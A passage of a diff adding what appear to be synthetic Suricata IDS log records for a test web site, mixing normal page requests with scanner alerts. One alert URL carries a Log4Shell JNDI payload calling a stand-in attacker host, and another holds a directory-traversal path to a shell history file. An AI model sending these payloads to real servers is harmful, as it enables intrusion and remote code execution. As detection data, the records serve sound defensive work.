+            "signature": "ET WEB_SERVER Joomla Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/joomla/plugins/",
+            "http_user_agent": "Mozilla/5.0 (compatible; JoomlaScan/2.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:17.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:19.130726+0300",
+        "flow_id": 1829127292340161,
+        "pcap_cnt": 140161,
+        "event_type": "http",
+        "src_ip": "192.168.1.182",
+        "src_port": 55153,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/js/vendor.js",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "application/javascript",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 45678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 8,
+            "pkts_toclient": 12,
+            "bytes_toserver": 1345,
+            "bytes_toclient": 47234,
+            "start": "2025-02-23T10:16:18.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:20.130726+0300",
+        "flow_id": 1829127292340162,
+        "pcap_cnt": 140162,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38926,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2025594,
+            "rev": 7,
+            "signature": "ET WEB_SERVER WordPress Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/wp-json/",
+            "http_user_agent": "WPScan/3.8",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:19.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:21.130726+0300",
+        "flow_id": 1829127292340163,
+        "pcap_cnt": 140163,
+        "event_type": "http",
+        "src_ip": "192.168.1.185",
+        "src_port": 55154,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/images/photo.jpg",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "image/jpeg",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 89234
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 9,
+            "pkts_toclient": 24,
+            "bytes_toserver": 1678,
+            "bytes_toclient": 90123,
+            "start": "2025-02-23T10:16:20.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:22.130726+0300",
+        "flow_id": 1829127292340164,
+        "pcap_cnt": 140164,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55215,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2013024,
+            "rev": 11,
+            "signature": "ET SCAN Acunetix User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/web-console/ServerInfo",
+            "http_user_agent": "Mozilla/5.0 (compatible; Acunetix)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:21.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:23.130726+0300",
+        "flow_id": 1829127292340165,
+        "pcap_cnt": 140165,
+        "event_type": "http",
+        "src_ip": "192.168.1.188",
+        "src_port": 55155,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/contact.html",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 8923
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 734,
+            "bytes_toclient": 9234,
+            "start": "2025-02-23T10:16:22.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:24.130726+0300",
+        "flow_id": 1829127292340166,
+        "pcap_cnt": 140166,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38927,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2034921,
+            "rev": 5,
+            "signature": "ET WEB_SERVER Spring Boot Actuator Scan",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/actuator/health",
+            "http_user_agent": "Mozilla/5.0 (compatible; SpringScan/1.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:23.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:25.130726+0300",
+        "flow_id": 1829127292340167,
+        "pcap_cnt": 140167,
+        "event_type": "http",
+        "src_ip": "192.168.1.190",
+        "src_port": 55156,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/about.html",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 5678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 745,
+            "bytes_toclient": 5987,
+            "start": "2025-02-23T10:16:24.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:26.130726+0300",
+        "flow_id": 1829127292340168,
+        "pcap_cnt": 140168,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55216,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002664,
+            "rev": 10,
+            "signature": "ET SCAN Nessus User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/geoserver/web",
+            "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:25.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:27.130726+0300",
+        "flow_id": 1829127292340169,
+        "pcap_cnt": 140169,
+        "event_type": "http",
+        "src_ip": "192.168.1.192",
+        "src_port": 55157,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/api/v1/products",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "application/json",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 23456
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 7,
+            "pkts_toclient": 9,
+            "bytes_toserver": 1123,
+            "bytes_toclient": 24123,
+            "start": "2025-02-23T10:16:26.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:28.130726+0300",
+        "flow_id": 1829127292340170,
+        "pcap_cnt": 140170,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38928,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2010935,
+            "rev": 12,
+            "signature": "ET SCAN Nikto User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/manager/html",
+            "http_user_agent": "Mozilla/5.0 (Nikto/2.5)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 556,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:27.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:29.130726+0300",
+        "flow_id": 1829127292340171,
+        "pcap_cnt": 140171,
+        "event_type": "http",
+        "src_ip": "192.168.1.195",
+        "src_port": 55158,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/blog/",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 15678
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 8,
+            "bytes_toserver": 923,
+            "bytes_toclient": 16234,
+            "start": "2025-02-23T10:16:28.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:30.130726+0300",
+        "flow_id": 1829127292340172,
+        "pcap_cnt": 140172,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55217,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Possible Directory Traversal",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/../../../../home/user/.bash_history",
+            "http_user_agent": "sqlmap/1.6",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 634,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:29.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:31.130726+0300",
+        "flow_id": 1829127292340173,
+        "pcap_cnt": 140173,
+        "event_type": "http",
+        "src_ip": "192.168.1.198",
+        "src_port": 55159,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/images/banner2.jpg",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "image/jpeg",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 56789
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 8,
+            "pkts_toclient": 19,
+            "bytes_toserver": 1456,
+            "bytes_toclient": 58123,
+            "start": "2025-02-23T10:16:30.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:32.130726+0300",
+        "flow_id": 1829127292340174,
+        "pcap_cnt": 140174,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38929,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002911,
+            "rev": 9,
+            "signature": "ET SCAN OpenVAS User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/jenkins/",
+            "http_user_agent": "Mozilla/5.0 (compatible; OpenVAS)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 545,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:31.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:33.130726+0300",
+        "flow_id": 1829127292340175,
+        "pcap_cnt": 140175,
+        "event_type": "http",
+        "src_ip": "192.168.1.200",
+        "src_port": 55160,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/search?q=world",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 6789
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 6,
+            "bytes_toserver": 789,
+            "bytes_toclient": 7123,
+            "start": "2025-02-23T10:16:32.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:34.130726+0300",
+        "flow_id": 1829127292340176,
+        "pcap_cnt": 140176,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55218,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2025594,
+            "rev": 7,
+            "signature": "ET WEB_SERVER WordPress Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/wp-content/plugins/akismet/",
+            "http_user_agent": "WPScan/3.8",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 589,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:33.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:35.130726+0300",
+        "flow_id": 1829127292340177,
+        "pcap_cnt": 140177,
+        "event_type": "http",
+        "src_ip": "192.168.1.202",
+        "src_port": 55161,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/css/print.css",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "text/css",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 2345
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 5,
+            "bytes_toserver": 645,
+            "bytes_toclient": 2789,
+            "start": "2025-02-23T10:16:34.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:36.130726+0300",
+        "flow_id": 1829127292340178,
+        "pcap_cnt": 140178,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38930,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2034921,
+            "rev": 5,
+            "signature": "ET WEB_SERVER Spring Boot Actuator Scan",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/actuator/env",
+            "http_user_agent": "Mozilla/5.0 (compatible; SpringScan/1.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:35.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:37.130726+0300",
+        "flow_id": 1829127292340179,
+        "pcap_cnt": 140179,
+        "event_type": "http",
+        "src_ip": "192.168.1.205",
+        "src_port": 55162,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/js/main.js",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "application/javascript",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 34567
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 7,
+            "pkts_toclient": 10,
+            "bytes_toserver": 1123,
+            "bytes_toclient": 36123,
+            "start": "2025-02-23T10:16:36.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:38.130726+0300",
+        "flow_id": 1829127292340180,
+        "pcap_cnt": 140180,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55219,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2013024,
+            "rev": 11,
+            "signature": "ET SCAN Acunetix User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/swagger/index.html",
+            "http_user_agent": "Mozilla/5.0 (compatible; Acunetix)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:37.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:39.130726+0300",
+        "flow_id": 1829127292340181,
+        "pcap_cnt": 140181,
+        "event_type": "http",
+        "src_ip": "192.168.1.208",
+        "src_port": 55163,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/blog/post3",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 12345
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 6,
+            "pkts_toclient": 7,
+            "bytes_toserver": 856,
+            "bytes_toclient": 12893,
+            "start": "2025-02-23T10:16:38.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:40.130726+0300",
+        "flow_id": 1829127292340182,
+        "pcap_cnt": 140182,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38931,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2010935,
+            "rev": 12,
+            "signature": "ET SCAN Nikto User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/weblogic/console",
+            "http_user_agent": "Mozilla/5.0 (Nikto/2.5)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 567,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:39.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:41.130726+0300",
+        "flow_id": 1829127292340183,
+        "pcap_cnt": 140183,
+        "event_type": "http",
+        "src_ip": "192.168.1.210",
+        "src_port": 55164,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/images/icon2.svg",
+            "http_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "image/svg+xml",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 1567
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 5,
+            "bytes_toserver": 645,
+            "bytes_toclient": 1890,
+            "start": "2025-02-23T10:16:40.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:42.130726+0300",
+        "flow_id": 1829127292340184,
+        "pcap_cnt": 140184,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55220,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002664,
+            "rev": 10,
+            "signature": "ET SCAN Nessus User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/config/server.xml",
+            "http_user_agent": "Mozilla/4.75 [en] (X11, U; Nessus)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:41.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:43.130726+0300",
+        "flow_id": 1829127292340185,
+        "pcap_cnt": 140185,
+        "event_type": "http",
+        "src_ip": "192.168.1.212",
+        "src_port": 55165,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/products/item4",
+            "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 7890
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 7,
+            "bytes_toserver": 834,
+            "bytes_toclient": 8234,
+            "start": "2025-02-23T10:16:42.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:44.130726+0300",
+        "flow_id": 1829127292340186,
+        "pcap_cnt": 140186,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38932,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2022847,
+            "rev": 8,
+            "signature": "ET WEB_SERVER Log4Shell JNDI Injection Attempt",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/webapp/${jndi:ldap://attacker.net/exploit}",
+            "http_user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 645,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:43.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:45.130726+0300",
+        "flow_id": 1829127292340187,
+        "pcap_cnt": 140187,
+        "event_type": "http",
+        "src_ip": "192.168.1.215",
+        "src_port": 55166,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/fonts/font2.woff2",
+            "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "http_content_type": "font/woff2",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 27890
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 5,
+            "pkts_toclient": 8,
+            "bytes_toserver": 789,
+            "bytes_toclient": 28901,
+            "start": "2025-02-23T10:16:44.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:46.130726+0300",
+        "flow_id": 1829127292340188,
+        "pcap_cnt": 140188,
+        "event_type": "alert",
+        "src_ip": "192.168.7.221",
+        "src_port": 55221,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2029112,
+            "rev": 6,
+            "signature": "ET WEB_SERVER Joomla Vulnerability Scanner",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/joomla/templates/",
+            "http_user_agent": "Mozilla/5.0 (compatible; JoomlaScan/2.0)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 578,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:45.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:47.130726+0300",
+        "flow_id": 1829127292340189,
+        "pcap_cnt": 140189,
+        "event_type": "http",
+        "src_ip": "192.168.1.218",
+        "src_port": 55167,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/api/v1/orders",
+            "http_user_agent": "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
+            "http_content_type": "application/json",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 200,
+            "length": 34567
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 7,
+            "pkts_toclient": 9,
+            "bytes_toserver": 1198,
+            "bytes_toclient": 36123,
+            "start": "2025-02-23T10:16:46.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:48.130726+0300",
+        "flow_id": 1829127292340190,
+        "pcap_cnt": 140190,
+        "event_type": "alert",
+        "src_ip": "192.168.9.31",
+        "src_port": 38933,
+        "dest_ip": "192.168.0.2",
+        "dest_port": 80,
+        "proto": "TCP",
+        "tx_id": 0,
+        "alert": {
+            "action": "allowed",
+            "gid": 1,
+            "signature_id": 2002911,
+            "rev": 9,
+            "signature": "ET SCAN OpenVAS User Agent",
+            "category": "Attempted Information Leak",
+            "severity": 2
+        },
+        "http": {
+            "hostname": "our-legal-site.example.local",
+            "url": "/console/",
+            "http_user_agent": "Mozilla/5.0 (compatible; OpenVAS)",
+            "http_content_type": "text/html",
+            "http_method": "GET",
+            "protocol": "HTTP/1.1",
+            "status": 404,
+            "length": 209
+        },
+        "app_proto": "http",
+        "flow": {
+            "pkts_toserver": 4,
+            "pkts_toclient": 4,
+            "bytes_toserver": 545,
+            "bytes_toclient": 671,
+            "start": "2025-02-23T10:16:47.870356+0300"
+        }
+    },
+    {
+        "timestamp": "2025-02-23T10:16:49.130726+0300",
